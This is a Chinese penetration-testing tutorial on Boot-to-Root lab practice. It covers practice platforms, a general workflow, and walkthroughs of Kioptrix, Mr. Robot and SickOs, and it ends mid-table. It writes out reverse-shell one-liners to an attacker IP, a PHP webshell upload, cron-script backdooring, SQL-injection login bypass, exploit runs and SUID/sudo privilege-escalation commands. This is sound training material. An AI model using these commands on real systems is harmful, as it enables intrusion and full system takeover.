# 靶场12：Boot-to-Root

> **难度等级**：🟡 中等
> **预计学习时间**：150分钟
> **学习目标**：
> - 理解Boot-to-Root的概念和意义
> - 掌握经典B2R靶场平台和推荐靶机
> - 熟练掌握B2R通用渗透思路和流程
> - 通过完整实战示例掌握从开机到拿root的全流程
> - 建立系统的B2R学习方法和解题思路

---

## 一、什么是Boot-to-Root

Boot-to-Root（简称B2R），直译就是"从开机到拿root"，是一种经典的渗透测试练习模式。学员从一台开机状态的虚拟机开始，目标是通过各种漏洞利用和技术手段，最终获取系统的root/管理员权限。

### 1.1 B2R的起源

B2R的概念最早来源于CTF（Capture The Flag）竞赛中的Pwn题型。随着信息安全的发展，B2R逐渐演变成一种独立的练习模式，通过精心设计的虚拟机靶场，帮助学员练习系统渗透和提权技术。

**标志性事件**：
- 2008年左右，VulnHub网站上线，提供大量B2R靶机下载
- 2013年，Hack The Box平台上线，开启在线B2R新时代
- 2018年，TryHackMe平台崛起，降低了B2R的学习门槛

### 1.2 B2R的特点

- **单目标**：通常只有一台靶机，目标明确
- **完整流程**：从信息收集到最终提权，流程完整
- **难度分级**：从入门到高级，各种难度都有
- **漏洞多样**：涵盖Web漏洞、服务漏洞、配置错误、内核漏洞等
- **即时反馈**：拿到flag就是通关证明

### 1.3 为什么要学B2R

- **打好基础**：B2R是渗透测试的基础功
- **培养思路**：锻炼系统化的渗透测试思维
- **积累经验**：接触各种不同类型的漏洞
- **提升能力**：信息收集、漏洞分析、提权技术全面提升
- **准备认证**：OSCP、eJPT等认证考试的核心内容

---

## 二、经典B2R靶场介绍

### 2.1 VulnHub系列

**官网**：https://www.vulnhub.com/

**简介**：
VulnHub是最早的B2R靶场平台之一，提供大量可下载的虚拟机靶机。用户下载虚拟机镜像后，在本地VMware/VirtualBox中运行进行练习。

**特点**：
- 完全免费，镜像可下载
- 靶机数量众多（数百台）
- 难度覆盖从入门到高级
- 各种操作系统和漏洞类型都有
- 社区活跃，Writeup丰富

**适合人群**：
- 网络安全初学者
- 想要系统练习提权技术的学员
- 准备OSCP认证的考生
- 喜欢离线练习的人

### 2.2 Hack The Box

**官网**：https://www.hackthebox.com/

**简介**：
Hack The Box（简称HTB）是最知名的在线B2R平台之一。用户通过VPN连接到HTB的网络环境，在线攻克各种靶机。

**特点**：
- 在线平台，无需本地虚拟机
- 靶机质量高，设计精良
- 活跃的排行榜和社区
- 提供Starting Point、Tracks等学习路径
- 有免费版和付费版

**适合人群**：
- 有一定基础的安全爱好者
- 想要挑战高难度靶机的学员
- 准备OSCP/OSCE认证的考生
- 喜欢竞技和排名的人

### 2.3 TryHackMe

**官网**：https://tryhackme.com/

**简介**：
TryHackMe（简称THM）是一个游戏化的网络安全学习平台，以"房间（Room）"的形式组织内容，涵盖B2R、Web安全、内网渗透等多个方向。

**特点**：
- 游戏化设计，学习体验好
- 有详细的引导和提示
- 内容体系化，有学习路径
- 社区友好，适合初学者
- 免费内容丰富

**适合人群**：
- 网络安全零基础入门者
- 喜欢循序渐进学习的人
- 想要体系化学习安全的学员
- 学生和自学者

### 2.4 Offensive Security Proving Grounds

**官网**：https://www.offsec.com/labs/

**简介**：
Offensive Security Proving Grounds（简称PG）是Offensive Security官方推出的练习平台，专为OSCP备考设计。

**特点**：
- 官方OSCP备考平台
- 靶机风格和OSCP考试高度一致
- 有Practice和Play两种模式
- 提供详细的报告和评分
- 付费平台

**适合人群**：
- 准备OSCP认证的考生
- 想要模拟真实考试环境的人
- 中高级安全从业者

### 2.5 平台对比

| 平台 | 形式 | 费用 | 难度 | 靶机数量 | 特点 |
|------|------|------|------|----------|------|
| VulnHub | 本地虚拟机 | 免费 | 从易到难 | 数百台 | 资源丰富，完全离线 |
| Hack The Box | 在线VPN | 免费/付费 | 中等-困难 | 数百台 | 质量高，社区活跃 |
| TryHackMe | 在线 | 免费/付费 | 入门-中等 | 数百个房间 | 游戏化，适合入门 |
| Proving Grounds | 在线VPN | 付费 | 中等-困难 | 上百台 | OSCP备考首选 |

---

## 三、VulnHub经典靶场推荐

### 3.1 Mr. Robot

**难度**：⭐⭐ 入门级
**操作系统**：Linux
**标签**：Web、CMS、WordPress、提权

**简介**：
以经典美剧《黑客军团》为主题的靶机，趣味性和技术性兼具。靶机设计了大量彩蛋，渗透过程就像在追剧一样。

**知识点**：
- WordPress安全
- 密码暴力破解
- 反向Shell
- Linux提权（SUID）
- 信息收集技巧

**推荐理由**：
- 趣味性强，适合培养学习兴趣
- 漏洞利用难度适中
- 包含Web和系统提权两部分，流程完整

### 3.2 Kioptrix系列

**难度**：⭐⭐ 入门级
**操作系统**：Linux
**标签**：经典、提权、服务漏洞

**简介**：
Kioptrix系列是B2R入门的经典中的经典，共有5个靶机，难度逐步提升。几乎所有学习B2R的人都是从Kioptrix开始的。

**各靶机特点**：
- **Kioptrix Level 1**：Samba漏洞利用，最简单的入门靶机
- **Kioptrix Level 1.1**：Web应用漏洞 + 本地提权
- **Kioptrix Level 2**：SQL注入 + 内核漏洞提权
- **Kioptrix Level 3**：Web CMS漏洞 + 权限提升
- **Kioptrix Level 4**：数据库漏洞 + 本地提权

**推荐理由**：
- 经典必刷，不打Kioptrix不算学过B2R
- 难度循序渐进，适合入门
- 涵盖多种常见漏洞类型

### 3.3 pWnOS

**难度**：⭐⭐ 入门级
**操作系统**：Linux
**标签**：Web、SQL注入、提权

**简介**：
pWnOS系列是另一套经典的入门级B2R靶机，Web漏洞利用为主，辅以系统提权。

**知识点**：
- SQL注入
- 文件上传漏洞
- 信息收集
- Linux提权

### 3.4 Stuxnet

**难度**：⭐⭐⭐ 中级
**操作系统**：Windows
**标签**：Windows、提权、工控

**简介**：
以著名的震网病毒命名的Windows靶机，练习Windows系统渗透和提权。

**知识点**：
- Windows服务漏洞
- 本地提权
- Windows信息收集
- Flag查找技巧

### 3.5 SkyTower

**难度**：⭐⭐⭐ 中级
**操作系统**：Linux
**标签**：Web、SQL注入、SSH、代理

**简介**：
SkyTower是一个设计巧妙的中级靶机，需要绕过各种限制才能成功渗透。

**知识点**：
- SQL注入绕过
- SSH隧道技术
- 本地端口转发
- 提权技术

### 3.6 SickOs

**难度**：⭐⭐⭐ 中级
**操作系统**：Linux
**标签**：Web、Shellshock、提权

**简介**：
SickOs系列是中级B2R的优秀靶场，包含SickOs 1.1和1.2两个靶机。

**知识点**：
- Shellshock漏洞
- 文件上传绕过
- 计划任务提权
- 内核漏洞

### 3.7 FristLeaks

**难度**：⭐⭐⭐ 中级
**操作系统**：Linux
**标签**：Web、代码审计、提权

**简介**：
FristLeaks是一个需要一定代码审计能力的靶机，Web层面的漏洞利用比较有特色。

**知识点**：
- Web代码审计
- 命令执行漏洞
- Linux提权
- 信息收集

### 3.8 Brainpan

**难度**：⭐⭐⭐⭐ 高级
**操作系统**：Linux
**标签**：缓冲区溢出、Pwn、提权

**简介**：
Brainpan是一个经典的缓冲区溢出练习靶机，适合想要学习Pwn技术的学员。

**知识点**：
- 缓冲区溢出
- Shellcode编写
- 内存破坏利用
- Linux提权

### 3.9 更多推荐

**入门级**：
- Basic Pentesting 1/2
- SickRage
- Prime系列
- Stapler
- DC系列（DC-1到DC-9）

**中级**：
- HackInOS
- Born2Root
- Tr0ll系列
- WinterMute
- CengBox系列

**高级**：
- Hackfest系列
- 42Challenge
- NightFall
- CTF系列靶机

---

## 四、通用B2R思路和流程

B2R虽然靶机各不相同，但基本思路和流程是相通的。掌握通用方法论，可以快速适应任何新靶机。

### 4.1 整体流程

```
信息收集 → 漏洞探测 → 漏洞利用 → 获取Shell → 本地信息收集 → 权限提升 → 提取Flag
```

> 💡 **深入理解：B2R为什么是这个流程？——"剥洋葱"式的递进攻击**
>
> B2R的每一步都有它存在的理由，不是随便排列的。理解为什么这样做，比记住流程更重要。
>
> 这个流程本质上是一个**从外到内、从少到多、从低到高**的递进过程：
>
> ```
> 剥洋葱第一层：信息收集（你什么都不知道）
>    → 这步是最重要的！信息越少，后面的选择越盲目
>    → 就像猎人上山打猎，先观察哪里有猎物、什么地形
>
> 剥洋葱第二层：漏洞探测（你知道有什么端口、什么服务，但不知道哪里有洞）
>    → 根据信息收集的结果，有目的地去"敲门"
>    → 就像侦察兵看了地形图后，找哪里防守有缺口
>
> 剥洋葱第三层：漏洞利用（你知道哪里有洞，想钻进去）
>    → 这步最需要技巧和变通，同一个洞可能有不同利用方法
>    → 就像找到了一扇没锁的窗户，但怎么爬进去要随机应变
>
> 剥洋葱第四层：获取Shell（你在里面了，但只是普通权限）
>    → 前几步的成功不代表结束，只是拿到了门票
>    → 就像溜进了大楼，但你是普通访客，很多地方去不了
>
> 剥洋葱第五层：本地信息收集（你在里面，但要搞清楚里面的结构）
>    → 这步和第二轮信息收集最关键的不同：视角变了！
>    - 外网信息收集 = 在围墙外转圈看
>    - 本地信息收集 = 进到屋里翻抽屉了！
>    → 看到的完全不一样！
>
> 剥洋葱第六层：权限提升（你要拿最高权限）
>    → 从普通访客变成大楼主人
>    → 用本地信息收集找到的"漏洞"提升自己
> ```
>
> **核心理解**：B2R的每一步都在"扩大你的知识范围"。
> 你从外网看到的信息是有限的，进入Shell后能看到更多，
> 拿到root后就能看全部。这个过程就是"剥洋葱"。

### 4.2 第一步：信息收集

信息收集是B2R最重要的一步，收集的信息越多，找到漏洞的概率越大。

**端口扫描**：

```bash
# 全端口扫描
nmap -p- -sV -sC -O 192.168.1.100 -oN nmap_full.txt

# 快速扫描
nmap -sV -sC -sT -Pn 192.168.1.100

# 详细脚本扫描
nmap --script vuln -sV 192.168.1.100
```

**Web信息收集**：

```bash
# 目录扫描
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

dirsearch -u http://192.168.1.100 -e php,txt,html,zip

# 子域名枚举
wfuzz -c -w /usr/share/wordlists/wfuzz/general/common.txt -H "Host: FUZZ.example.com" http://192.168.1.100

# CMS识别
whatweb http://192.168.1.100
cmsmap http://192.168.1.100
```

**常见关注点**：
- 开放端口和运行的服务
- Web应用框架和CMS
- 隐藏文件和目录
- 注释中的敏感信息
- 版本信息（用于查找已知漏洞）

### 4.3 第二步：漏洞探测和利用

根据信息收集的结果，查找对应的漏洞。

**常见Web漏洞**：
- SQL注入
- 远程命令执行（RCE）
- 文件上传漏洞
- 文件包含漏洞（LFI/RFI）
- 认证绕过
- XSS（反射型通常对B2R用处不大）

**常见服务漏洞**：
- FTP弱口令/匿名登录
- SSH弱口令
- Samba漏洞
- 数据库漏洞（MySQL、PostgreSQL等）
- 邮件服务漏洞
- 中间件漏洞（Tomcat、Weblogic、JBoss等）

**漏洞查找工具**：

```bash
# Searchsploit搜索漏洞
searchsploit apache 2.4.49
searchsploit wordpress 5.8

# Metasploit搜索
msfconsole
search type:exploit platform:linux tomcat
```

### 4.4 第三步：获取Shell

找到漏洞后，利用漏洞获取Shell。

**获取Shell的常见方式**：

1. **反向Shell（Reverse Shell）**

```bash
# 攻击机监听
nc -lvnp 4444

# 目标机执行（各种语言的反向Shell）
# Bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# PHP
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat
nc -e /bin/sh 10.0.0.1 4444
```

2. **正向Shell（Bind Shell）**

```bash
# 目标机监听
nc -lvnp 4444 -e /bin/bash

# 攻击机连接
nc 192.168.1.100 4444
```

> 💡 **深入理解：反向Shell和Bind Shell的本质区别——"谁主动找谁"**
>
> B2R中经常要在"反向Shell"和"Bind Shell"之间选择，
> 很多新手搞不清什么场景该用哪个。核心区别在于"谁主动建立连接"：
>
> ```
> 反向Shell（Reverse Shell）= 让靶机来找你
>   靶机 ←主动连接→ 攻击机
>   - 你需要先在攻击机上监听端口（nc -lvp 4444）
>   - 靶机执行：bash -i >& /dev/tcp/你IP/4444 0>&1
>   - 靶机主动连你 → Shell弹给你
>
>   优点：可以穿透大部分防火墙（因为出站连接通常不限制）
>   场景：靶机有防火墙，禁止入站连接时首选！
>
> Bind Shell = 你去找靶机
>   攻击机 ←主动连接→ 靶机
>   - 靶机上先监听端口（nc -lvp 4444 -e /bin/bash）
>   - 你主动连接：nc 靶机IP 4444
>
>   优点：简单直接
>   场景：靶机没有防火墙，或者你已经在同一内网时
> ```
>
> **为什么实战中反向Shell更常用？**
> 因为现实网络中，几乎所有的防火墙都允许出站访问（80/443/53），
> 但不允许外网主动连入内网机器。
> 反向Shell让靶机"假装在浏览网页"一样把Shell送出来。
>
> **类比理解**：反向Shell = 让靶机"主动给你打电话"，你接起来就能对话；
> Bind Shell = 你在靶机门口等它"开门"，等门开了你进去。前者你可以在任何地方接电话，
> 后者你必须找到靶机的门。

3. **WebShell**

通过文件上传或代码执行漏洞写入WebShell，然后通过浏览器或工具连接。

**升级交互式Shell**：

```bash
# Python升级Shell
python -c 'import pty; pty.spawn("/bin/bash")'

# 或使用script
script /dev/null -c bash

# 设置终端大小（先按Ctrl+Z挂起）
stty raw -echo
fg
reset
export SHELL=bash
export TERM=xterm-256color
stty rows 40 columns 120
```

### 4.5 第四步：本地信息收集

拿到Shell后，进行本地信息收集，寻找提权路径。

**系统信息**：

```bash
# 系统信息
uname -a
cat /etc/os-release
cat /etc/issue
hostname

# 内核版本（用于查找内核漏洞）
uname -r
```

**用户和权限信息**：

```bash
# 当前用户
whoami
id
groups

# 所有用户
cat /etc/passwd
cat /etc/shadow  # 需要root权限

# sudo权限
sudo -l
```

**网络信息**：

```bash
ip a
ifconfig
netstat -tulnp
ss -tulnp
cat /etc/hosts
```

**文件系统信息**：

```bash
# 当前目录文件
ls -la

# 家目录
ls -la ~/
ls -la /home/

# 敏感文件查找
find / -name "*.txt" -o -name "*.bak" -o -name "*.sql" 2>/dev/null
find / -perm -u=s -type f 2>/dev/null  # SUID文件
find / -perm -g=s -type f 2>/dev/null  # SGID文件
```

**进程和服务**：

```bash
ps aux
ps -ef
service --status-all
systemctl list-units --type=service
```

**定时任务**：

```bash
crontab -l
ls -la /etc/cron*
cat /etc/crontab
```

### 4.6 第五步：权限提升

根据本地信息收集的结果，选择合适的提权方法。

> 💡 **深入理解：提权的本质——从"你被允许做的事"到"你能做到的事"**
>
> 很多新手把提权理解为"找漏洞→跑EXP→拿root"，这种理解太表面了。
> 提权的核心本质是：**找到权限模型和实际能力之间的"缝隙"**。
>
> 用通俗的话解释提权到底在做什么：
>
> ```
> 操作系统说："用户www-data只能做A、B、C三件事"
> 黑客说："但我发现你有一个SUID程序，通过它我能做到D、E、F..."
> 操作系统说："但是D、E、F不是www-data该做的！"
> 黑客说："可你的程序check权限时只验证了'是否是合法用户'，
>          没验证'该用户有没有资格做D、E、F'——我把攻击代码藏在了A操作里！
>          你的程序在执行A时，顺手帮我执行了D、E、F"
> ```
>
> 这就是提权的本质——**滥用权限**，不是你有了新权限，而是你让
> 系统用你现有的权限，帮你做了本不该你能做的事。
>
> 理解了这个本质，就能理解各种提权方法的"为什么"：
>
> **内核漏洞提权 = 操作系统本身有bug**
> ```
> 类比：大楼的门禁系统有后门，输入特定密码就能刷卡当管理员
> 原理：内核代码在处理某个系统调用时，错误地允许低权限用户
>       访问高权限内存/执行高权限操作
> ```
>
> **SUID提权 = 程序被标记为"可以越权"**
> ```
> 类比：有个员工卡说"持有此卡者可进入所有区域"
>       你捡到这张卡 → 刷卡进入禁区
> 原理：SUID标记让程序以root权限运行，如果程序内部有
>       执行命令/读写文件的功能且没做好限制，你就能利用它
> ```
>
> **sudo提权 = 你被管理员"授权"了但管理员配错了**
> ```
> 类比：老板说"你可以用这台电脑查库存"
>       你发现这台电脑也可以发邮件、改订单、看薪资
>       老板授权的只是查库存，但给了你整个电脑的权限
> 原理：sudo配置白名单时写得太宽泛（比如允许vim），
>       而vim有能力执行shell命令 → 提权
> ```
>
> **计划任务提权 = 系统有个"自动执行"的程序，你能改它**
> ```
> 类比：大楼每天凌晨3点自动开空调，控制面板在走廊
>       你改写控制面板脚本，让它在开空调时顺便帮你开金库门
> 原理：cron以root权限运行脚本，如果你能修改脚本内容
>       → 你的代码将以root身份执行
> ```
>
> **理解本质的好处**：当你明白提权是"找权限和能力的缝隙"时，
> 你就不会死记"用LinPEAS跑一遍"，而是带着这个思维去审视
> 每一个发现的配置、每一个SUID文件、每一个定时任务
> ——"这个东西能不能让我做到本来做不到的事？"

**Linux常见提权方法**：

1. **内核漏洞提权**

```bash
# 使用Linux Exploit Suggester
./linux-exploit-suggester.sh

# 使用LinPEAS
./linpeas.sh

# 内核漏洞示例：Dirty Cow
# 编译并运行对应版本的漏洞利用程序
```

2. **SUID/SGID提权**

```bash
# 查找SUID文件
find / -perm -u=s -type f 2>/dev/null

# 如果find有SUID权限
find . -exec /bin/sh -p \; -quit

# 如果nmap有SUID权限（旧版本）
nmap --interactive
nmap> !sh
```

3. **sudo提权**

```bash
# 查看sudo权限
sudo -l

# 如果可以sudo执行某个程序
# 查GTFOBins看能否提权
# 例如：sudo vim -c ':!/bin/sh'
```

4. **计划任务提权**

```bash
# 查看root的计划任务
cat /etc/crontab

# 如果计划任务执行的脚本可写
# 修改脚本添加反向Shell
```

5. **密码复用**

```bash
# 查找配置文件中的密码
grep -r "password" /var/www/ 2>/dev/null
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
```

**Windows常见提权方法**：

1. **系统内核漏洞**
   - MS15-051
   - MS16-032
   - MS17-010（永恒之蓝）
   - CVE-2021-40449

2. **服务配置错误**
   - 服务路径未加引号
   - 服务可执行文件权限过宽
   - 服务注册表权限错误

3. **计划任务提权**
4. **注册表Run键值**
5. **AlwaysInstallElevated**
6. **令牌窃取（烂土豆等）**

**提权辅助工具**：

| 工具 | 系统 | 说明 |
|------|------|------|
| LinPEAS | Linux | 全面的Linux提权枚举脚本 |
| WinPEAS | Windows | 全面的Windows提权枚举脚本 |
| linux-exploit-suggester | Linux | 内核漏洞推荐工具 |
| windows-exploit-suggester | Windows | Windows漏洞推荐工具 |
| GTFOBins | Linux | Unix二进制提权参考 |
| LOLBAS | Windows | Windows自带工具利用参考 |

### 4.7 第六步：提取Flag

成功提权后，找到flag文件。

**常见Flag位置**：

```bash
# Linux
cat /root/flag.txt
cat /root/proof.txt
cat /root/root.txt
find /root -name "*.txt" -o -name "flag*" -o -name "proof*" 2>/dev/null

# Windows
type C:\Users\Administrator\Desktop\flag.txt
type C:\root\flag.txt
```

**提权成功验证**：

```bash
# 验证是否为root
whoami
id

# 读取root flag
cat /root/root.txt
```

---

## 五、完整B2R实战示例

以 **Kioptrix Level 1** 为例，演示完整的B2R渗透流程。

### 5.1 环境准备

- 攻击机：Kali Linux（192.168.1.50）
- 靶机：Kioptrix Level 1（192.168.1.100）
- 目标：获取root权限并读取flag

### 5.2 第一步：信息收集

**端口扫描**：

```bash
nmap -p- -sV -sC -O 192.168.1.100 -oN kioptrix_nmap.txt
```

**扫描结果**（示例）：

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
1024/tcp open  status      1 (RPC #100024)
```

**信息分析**：
- 操作系统：Red Hat Linux（旧版本）
- Web服务：Apache 1.3.20 + mod_ssl 2.8.4 + OpenSSL 0.9.6b
- Samba服务：运行中，版本未知
- SSH服务：OpenSSH 2.9p2（版本较老）

### 5.3 第二步：漏洞探测

**方法一：Web服务漏洞**

```bash
# 搜索OpenSSL漏洞
searchsploit mod_ssl 2.8.4
# 发现：Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' 远程缓冲区溢出

searchsploit openssl 0.9.6b
```

**方法二：Samba服务漏洞**

```bash
# 枚举Samba版本
# 使用nmap脚本
nmap --script smb-os-discovery.nse -p 139,445 192.168.1.100

# 或者使用enum4linux
enum4linux 192.168.1.100

# 假设发现Samba版本为2.2.1a
searchsploit samba 2.2
# 发现：Samba 2.2.x - 'trans2open' 远程缓冲区溢出
```

### 5.4 第三步：漏洞利用（获取Shell）

**使用Samba trans2open漏洞**：

```bash
# 使用Metasploit
msfconsole

# 搜索exploit
search trans2open

# 使用exploit
use exploit/linux/samba/trans2open
set RHOSTS 192.168.1.100
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit
```

**或者使用OpenFuck（OpenSSL漏洞）**：

```bash
# 下载编译OpenFuck
searchsploit -m 764.c
gcc -o OpenFuck 764.c -lcrypto

# 运行
./OpenFuck 0x6b 192.168.1.100 443 -c 40
```

### 5.5 第四步：验证Shell和提权

```bash
# 查看当前用户
whoami
# 输出：root

# Kioptrix Level 1的漏洞利用后直接获得root权限
# 所以不需要额外提权步骤

# 验证
id
# 输出：uid=0(root) gid=0(root) groups=0(root)
```

### 5.6 第五步：提取Flag

```bash
# 查找flag
cat /root/flag.txt
cat /root/proof.txt
ls -la /root/

# Kioptrix的flag通常在/root目录下
cat /root/setuid.c  # 可能是提示信息

# 或者查看邮件
cat /var/spool/mail/root
```

### 5.7 通关总结

| 步骤 | 方法 | 时间 |
|------|------|------|
| 信息收集 | nmap全端口扫描 | 5分钟 |
| 漏洞探测 | 分析服务版本，搜索已知漏洞 | 10分钟 |
| 漏洞利用 | Samba trans2open远程溢出 | 5分钟 |
| 提权 | 利用漏洞直接获得root | 0分钟 |
| 提取Flag | 读取/root下的flag文件 | 2分钟 |

**经验总结**：
- 老版本系统通常存在已知的远程RCE漏洞
- 信息收集阶段要仔细记录每个服务的版本号
- Samba和OpenSSL的老版本是重点关注对象
- Kioptrix Level 1是入门必刷，非常适合新手建立信心

---

## 六、B2R学习建议

### 6.1 学习路线

**入门阶段（1-2个月）**：
1. 从Kioptrix Level 1开始，熟悉B2R流程
2. 刷完Kioptrix系列全部5个靶机
3. 刷Mr. Robot、Basic Pentesting等入门靶机
4. 重点：信息收集、Web漏洞、基础提权

**进阶阶段（2-4个月）**：
1. 刷中级难度靶机（SickOs、SkyTower、DC系列等）
2. 学习更多提权技术
3. 开始尝试Hack The Box的简单机器
4. 重点：代码审计、高级提权、绕过技巧

**高级阶段（4-6个月）**：
1. 刷高级难度靶机
2. 学习缓冲区溢出、内核漏洞利用
3. 挑战HTB的困难机器
4. 准备OSCP认证
5. 重点：底层漏洞利用、高级技巧

### 6.2 学习方法

1. **先自己做，再看Writeup**
   - 给自己设定时间限制（如4小时）
   - 实在做不出来再看Writeup
   - 看完后自己重新做一遍

2. **做好笔记**
   - 每个靶机记录漏洞点和利用方法
   - 整理提权方法清单
   - 建立自己的Cheat Sheet

3. **分类练习**
   - 集中练习Web类靶机
   - 集中练习提权类靶机
   - 集中练习Windows靶机
   - 集中练习Pwn类靶机

4. **写Writeup**
   - 每个靶机做完写一篇详细Writeup
   - 发布到博客或社区
   - 加深理解，同时帮助他人

### 6.3 常用资源

**Wordlists（字典）**：
- /usr/share/wordlists/（Kali自带）
- SecLists：https://github.com/danielmiessler/SecLists
- rockyou.txt（最常用的密码字典）

**提权参考**：
- GTFOBins：https://gtfobins.github.io/
- LOLBAS：https://lolbas-project.github.io/
- PayloadAllTheThings：https://github.com/swisskyrepo/PayloadsAllTheThings

**Writeup网站**：
- YouTube搜索靶机名+walkthrough
- Medium、HackerNoon等博客平台
- 各大安全论坛和社区

---

## 七、实战案例

### 案例1：Kioptrix通关

**场景**：通关Kioptrix Level 1.2（Level 2）。

**详细步骤**：

1. **信息收集**：
```bash
nmap -sV -p- 192.168.1.101
# 发现80端口和443端口有Web服务
# 发现MySQL服务运行
```

2. **Web漏洞利用**：
```
访问Web页面，发现是一个登录页面
尝试SQL注入
用户名：' OR '1'='1
密码：任意
成功登录，获得一个命令执行的功能
```

3. **获取Shell**：
```bash
# 在命令执行功能中执行反向Shell
bash -i >& /dev/tcp/192.168.1.50/4444 0>&1

# 攻击机监听获得Shell
nc -lvnp 4444
```

4. **本地信息收集**：
```bash
uname -r
# 发现内核版本较老，存在已知漏洞

# 或者
sudo -l
# 发现可以sudo执行某些命令
```

5. **提权**：
```bash
# 使用内核漏洞提权
# 编译对应版本的exploit
gcc exploit.c -o exploit
chmod +x exploit
./exploit

# 获得root权限
whoami
# root
```

**经验总结**：Kioptrix Level 2考察Web SQL注入 + 内核漏洞提权，是入门B2R的经典组合。

---

### 案例2：Mr.Robot通关

**场景**：通关Mr. Robot靶机。

**详细步骤**：

1. **信息收集**：
```bash
nmap -sV -sC 192.168.1.102
# 发现80端口和443端口
# Web站点是一个宣传页面

# 目录扫描
gobuster dir -u http://192.168.1.102 -w /usr/share/wordlists/dirb/common.txt
# 发现 /robots.txt
# 发现 /wp-login.php (WordPress)
```

2. **获取WordPress账号**：
```bash
# 查看robots.txt
# 发现一个字典文件和key-1-of-3.txt

# 暴力破解WordPress登录
wpscan --url http://192.168.1.102 --usernames elliot --passwords fsocity.dic
# 破解出密码
```

3. **获取WebShell**：
```bash
# 登录WordPress后台
# 修改主题的404.php模板，插入PHP代码
# 访问触发404的页面，获得Shell
```

4. **提权**：
```bash
# 信息收集
find / -perm -u=s -type f 2>/dev/null
# 发现nmap有SUID权限

# 利用nmap提权（旧版本支持交互模式）
nmap --interactive
nmap> !sh
# 获得root shell
```

5. **收集所有Flag**：
```bash
# 三个flag分别在不同位置
# key-1-of-3.txt - robots.txt中提到
# key-2-of-3.txt - 普通用户目录
# key-3-of-3.txt - root目录
```

**经验总结**：Mr. Robot是一个趣味性很强的靶机，考察WordPress安全、密码爆破和SUID提权，非常适合入门。

---

### 案例3：SickOs通关

**场景**：通关SickOs 1.1。

**详细步骤**：

1. **信息收集**：
```bash
nmap -sV -p- 192.168.1.103
# 发现22端口(SSH)和80端口(HTTP)

# 目录扫描
gobuster dir -u http://192.168.1.103 -w /usr/share/wordlists/dirb/common.txt
# 发现 /test/ 目录
```

2. **漏洞发现**：
```bash
# 查看/test目录
# 发现可以PUT上传文件
curl -X PUT http://192.168.1.103/test/shell.php -d '<?php system($_GET["cmd"]); ?>'

# 验证
curl http://192.168.1.103/test/shell.php?cmd=id
```

3. **获取Shell**：
```bash
# 上传反向Shell
# 攻击机监听
nc -lvnp 4444

# 执行反向Shell
curl "http://192.168.1.103/test/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.1.50\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
```

4. **提权**：
```bash
# 查看计划任务
cat /etc/crontab
# 发现root定期执行某个脚本

# 查看脚本权限
ls -la /path/to/script
# 发现脚本可写

# 修改脚本添加反向Shell
echo "bash -i >& /dev/tcp/192.168.1.50/5555 0>&1" >> /path/to/script

# 等待计划任务执行，获得root shell
```

**经验总结**：SickOs 1.1考察PUT方法上传文件 + 计划任务提权，是学习HTTP方法漏洞和定时任务提权的好靶机。

---

### 案例4：提权实战

**场景**：Linux提权的多种方法实战。

**方法一：SUID提权**

```bash
# 查找所有SUID文件
find / -perm -u=s -type f 2>/dev/null

# 常见可利用的SUID程序
# nmap（旧版本）
nmap --interactive
nmap> !sh

# vim
vim -c ':!/bin/sh'

# find
find . -exec /bin/sh -p \; -quit

# bash
bash -p
```

**方法二：sudo提权**

```bash
# 查看sudo权限
sudo -l

# 常见提权方式（查GTFOBins）
# sudo awk
sudo awk 'BEGIN {system("/bin/sh")}'

# sudo python
sudo python -c 'import os; os.system("/bin/sh")'

# sudo perl
sudo perl -e 'exec "/bin/sh";'
```

**方法三：内核漏洞提权**

```bash
# 查看内核版本
uname -r

# 使用Linux Exploit Suggester
./linux-exploit-suggester.sh

# 示例：Dirty Cow (CVE-2016-5195)
# 适用内核：2.6.22 - 4.8.3
# 下载对应exploit，编译运行
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```

**经验总结**：提权是B2R的核心技能之一，需要掌握多种提权方法。建议建立自己的提权Cheat Sheet，遇到提权问题时逐一排查。

---

### 案例5：CTF解题思路

**场景**：B2R靶机的通用解题思路和方法论。

**解题流程模板**：

```
第1步：端口扫描（5-10分钟）
├── nmap全端口扫描
├── 记录所有开放端口和服务版本
└── 标记可能存在漏洞的服务

第2步：Web侦察（15-30分钟）
├── 访问Web页面，了解功能
├── 目录扫描（多个字典）
├── 技术栈识别（CMS、框架、语言）
└── 查找已知漏洞

第3步：漏洞利用（30-60分钟）
├── 尝试Web漏洞（SQL注入、RCE、上传等）
├── 尝试服务漏洞（FTP、SSH、数据库等）
├── 查找默认凭据/弱口令
└── 搜索已知CVE

第4步：获取Shell（10-20分钟）
├── 选择合适的Shell方式
├── 升级到交互式Shell
└── 稳定Shell连接

第5步：本地枚举（20-30分钟）
├── 系统信息收集
├── 用户和权限信息
├── 网络和进程
├── 文件系统枚举
├── SUID/SGID查找
├── sudo权限检查
├── 计划任务检查
└── 配置文件和密码查找

第6步：提权（30-60分钟）
├── 尝试简单提权（SUID、sudo）
├── 尝试计划任务提权
├── 尝试密码复用
├── 尝试内核漏洞
└── 使用提权辅助工具

第7步：提取Flag（5分钟）
├── 查找flag文件
└── 记录通关方法
```

**常见卡点和突破思路**：

| 卡点 | 可能的突破点 |
|------|-------------|
